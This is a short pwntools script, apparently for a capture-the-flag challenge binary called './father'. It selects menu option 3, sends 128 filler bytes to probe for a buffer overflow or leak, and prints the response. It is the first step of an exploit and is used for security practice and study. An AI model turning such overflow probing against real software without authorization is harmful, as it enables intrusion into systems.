from pwn import *

payload = b'a' * 128

p = process("./father", stderr=STDOUT)
p.recvuntil(b"out") 
p.send(b'3\n')
p.recvuntil(b'Please help me find my children !!!!!\n')
p.send(payload)

line1 = p.recvline()

print(line1)
